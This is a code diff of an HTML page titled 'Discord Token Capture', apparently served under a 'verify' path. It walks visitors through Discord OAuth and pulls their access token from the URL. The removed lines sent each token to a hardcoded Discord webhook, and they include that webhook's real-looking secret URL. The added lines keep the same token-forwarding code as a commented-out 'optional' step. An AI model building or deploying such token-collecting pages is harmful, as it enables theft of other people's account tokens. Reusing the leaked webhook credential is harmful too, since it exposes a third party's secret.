@@ -1,23 +1,68 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Token Capture</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        textarea { margin-top: 10px; width: 80%; max-width: 500px; }
+        button { margin: 10px; padding: 5px 10px; }
+    </style>
+</head>
 <body>
-    <h1>Token Captured</h1>
-    <p>Paste this token to your shared doc or chat.</p>
-    <textarea id="tokenOutput" rows="4" cols="50"></textarea>
+    <h1>Discord Token Capture</h1>
+    <p>Click below to authorize an account, then copy the token.</p>
+    <button onclick="startAuth()">Authorize Account</button>
+    <br>
+    <textarea id="tokenOutput" rows="4" cols="50" placeholder="Your token will appear here..."></textarea>
+    <br>
+    <button onclick="copyToken()">Copy Token</button>
+
     <script>
-        const hash = window.location.hash.substring(1);
-        const params = new URLSearchParams(hash);
-        const token = params.get('access_token');
+        const CLIENT_ID = 'YOUR_CLIENT_ID'; // Replace with your Client ID
+        const REDIRECT_URI = 'https://captaintsu.github.io/verify/';
+        const AUTHORIZE_URL = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify`;
+
+        // Start authorization
+        function startAuth() {
+            window.location.href = AUTHORIZE_URL;
+        }
+
+        // Extract token from URL fragment
+        function getTokenFromUrl() {
+            const hash = window.location.hash.substring(1);
+            const params = new URLSearchParams(hash);
+            const token = params.get('access_token');
+            if (token) {
+                document.getElementById('tokenOutput').value = token;
+                // Optional: Clear the URL hash for cleanliness
+                window.history.replaceState({}, document.title, REDIRECT_URI);
+            }
+        }
+
+        // Copy token to clipboard
+        function copyToken() {
+            const tokenField = document.getElementById('tokenOutput');
+            tokenField.select();
+            document.execCommand('copy');
+            alert('Token copied to clipboard!');
+        }
+
+        // Check for token on page load
+        window.onload = getTokenFromUrl;
+
+        // Optional: Send token to Discord webhook (uncomment and configure if needed)
+        /*
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
         if (token) {
-            document.getElementById('tokenOutput').value = token;
-            console.log('Token:', token);
-            // Optional: Send to a shared endpoint (e.g., a Discord webhook)
-            fetch('https://discord.com/api/webhooks/1357350899294535881/Xy9T3_mGOnes3FCOj6b0fSzGGaOz2TOWzU8Y6ZchE5NhHK57zAW4mJ3W4A7osdgN6hJP', {
+            fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ content: `New token: ${token}` })
             }).then(() => console.log('Token sent to Discord'));
         }
+        */
     </script>
 </body>
 </html>
